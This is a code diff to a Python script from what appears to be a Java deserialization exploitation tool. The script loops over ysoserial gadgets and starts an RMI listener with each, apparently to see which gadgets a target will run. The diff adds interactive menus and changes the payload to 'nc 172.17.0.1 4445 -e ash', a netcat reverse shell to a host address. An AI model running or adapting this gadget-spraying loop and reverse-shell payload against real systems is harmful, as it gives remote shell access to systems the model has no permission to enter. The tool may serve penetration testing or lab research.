@@ -9,6 +9,7 @@ Use this to find how many deserializable gadgets a specific target is vulnerable
 import _common
 import ZHOR_Modules.fileManager as fm
 import ZHOR_Modules.nicePrints as np
+import ZHOR_Modules.userInputUtils as uiu
 import ZHOR_Modules.listUtils as lu
 import time
 import os
@@ -35,13 +36,12 @@ np.DEBUG = ('--debug' in sys.argv)
 
 if __name__ == '__main__':
     
-    np.infoPrint("Choose java version to use:")
-    lu.fancyPrint(_common.CONFIG['java-executables'])
-    _common.CHOSEN_JAVA_VERSION = int(input("> ")) -1
+    _common.CHOSEN_JAVA_VERSION , _ = uiu.interactiveListSelection(_common.CONFIG['java-executables'],promptMessage="Choose Java version to use:")
+    _ , _common.CHOSEN_COMPONENT = uiu.interactiveListSelection(_common.COMPONENTS,promptMessage="Choose component:")
 
     gadgets = fm.fileToSimpleList(_common.CONFIG["ysoserial-gadgets"])
 
-    command = "nc 10.20.30.40 4445 -e echo foo"
+    command = "nc 172.17.0.1 4445 -e ash"
 
     for g in gadgets:
         _common.RMGListen.start(g,command)
